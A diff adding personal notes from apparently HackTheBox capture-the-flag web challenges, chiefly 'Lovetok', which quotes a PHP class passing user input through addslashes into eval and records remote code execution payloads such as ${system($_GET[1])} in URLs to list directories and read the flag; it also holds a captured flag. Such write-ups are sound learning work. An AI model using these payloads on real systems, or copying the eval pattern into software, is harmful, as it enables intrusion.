@@ -80,5 +80,58 @@ looking at AST injection
 sql injection in 
 HTB{SQL_1nj3ct1ng_my_w4y_0utta_h3r3}
 
-# Weather app
+# Lovetok
+
+the time changes everytime hte page is refreshed
+
+we see inside entrypoint.sh
+
+`FLAG=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)
+`
+will give out random numbers
+
+```
+~/Downloads/web_lovetok ⌚ 13:03:55
+$ cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1
+
+Sz0Ir
+
+```
+
+The website handles all request path
+
+function for time
+
+```
+<?php
+class TimeModel
+{
+    public function __construct($format)
+    {
+        $this->format = addslashes($format);
+
+        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
+        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
+    }
+
+    public function getTime()
+    {
+        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
+        return isset($time) ? $time : 'Something went terribly wrong';
+    }
+}
+```
+
+Eval is the vulnerability, however you see the addslashes. looking at the net for addslashes we found.
+
+?format=${phpinfo()} if we add to the url it works
+
+you can enumerate th edirectory by : http://206.189.20.127:31160/?format=${system($_GET[1])}&1=ls+/
+
+th flag will be at : http://157.245.33.77:32397/?format=${system($_GET[1])}&1=cat+flagwGg4C
+
+not getting flags anymore though
+https://shakuganz.com/2021/06/23/hackthebox-lovetok-write-up/
+
+
 
